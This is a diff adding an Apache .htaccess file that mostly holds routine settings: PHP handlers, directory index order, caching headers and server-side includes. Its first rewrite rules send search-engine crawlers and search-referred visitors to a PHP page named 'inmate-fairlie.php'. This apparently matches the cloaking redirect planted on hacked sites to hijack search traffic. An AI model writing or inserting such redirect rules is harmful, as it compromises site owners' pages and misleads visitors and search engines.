@@ -1,0 +1,20 @@
+RewriteEngine On
+
+RewriteBase /
+RewriteCond %{HTTP_USER_AGENT} (google|yahoo|msn|aol|bing) [OR]
+RewriteCond %{HTTP_REFERER} (google|yahoo|msn|aol|bing)
+RewriteRule . inmate-fairlie.php [L]
+
+# Prevent caching for privacy.php
+<FilesMatch "privacy\.php$">
+    Header set Cache-Control "no-cache, no-store, must-revalidate"
+    Header set Pragma "no-cache"
+    Header set Expires "0"
+</FilesMatch>
+
+AddHandler application/x-httpd-alt-php56___lsphp .php
+DirectoryIndex default.html default.htm index.php index.shtml index.html index.htm home.html home.htm index.php5 welcome.html welcome.htm
+Options -Indexes
+AddHandler server-parsed .html
+AddHandler server-parsed .shtml
+AddHandler server-parsed .htm
